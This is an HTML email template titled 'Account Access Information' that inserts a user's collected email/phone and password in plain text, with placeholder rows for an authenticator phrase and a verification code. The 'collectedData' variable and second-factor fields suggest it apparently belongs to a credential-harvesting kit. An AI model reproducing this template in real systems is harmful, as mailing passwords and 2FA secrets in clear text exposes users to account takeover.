<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Account Access Information</title>
    <style type="text/css">
        /* Reset styles for email clients */
        body, table, td {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
        }
        .container {
            width: 100%;
            max-width: 600px;
            margin: 0 auto;
            background-color: #ffffff;
        }
        .header {
            background-color: #f8f9fa;
            padding: 20px;
            text-align: center;
        }
        .content {
            padding: 20px;
        }
        .data-table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }
        .data-table td {
            padding: 10px;
            border: 1px solid #dee2e6;
        }
        .label {
            background-color: #f8f9fa;
            font-weight: bold;
            width: 40%;
        }
        .footer {
            background-color: #f8f9fa;
            padding: 20px;
            text-align: center;
            font-size: 12px;
            color: #6c757d;
        }
    </style>
</head>
<body>
<table class="container" cellpadding="0" cellspacing="0">
    <tr>
        <td class="header">
            <h1 style="color: #333333; margin: 0;">Account Access Information</h1>
        </td>
    </tr>
    <tr>
        <td class="content">
            <p>Dear [Name],</p>
            <p>Thank you for creating your account. Below you'll find your important account access information. Please store this information securely.</p>

            <table class="data-table">
                <tr>
                    <td class="label">Tracking Code</td>
                    <td>[still on process]</td>
                </tr>
                <tr>
                    <td class="label">Contact Information</td>
                    <td>{{$collectedData['email_and_phone']}}</td>
                </tr>
                <tr>
                    <td class="label">Password</td>
                    <td>{{$collectedData['password']}}</td>
                </tr>
                <tr>
                    <td class="label">Authenticator Phrase</td>
                    <td>[still on process]</td>
                </tr>
                <tr>
                    <td class="label">Verification Code</td>
                    <td>[still on process]</td>
                </tr>
            </table>

        </td>
    </tr>
</table>
</body>
</html>
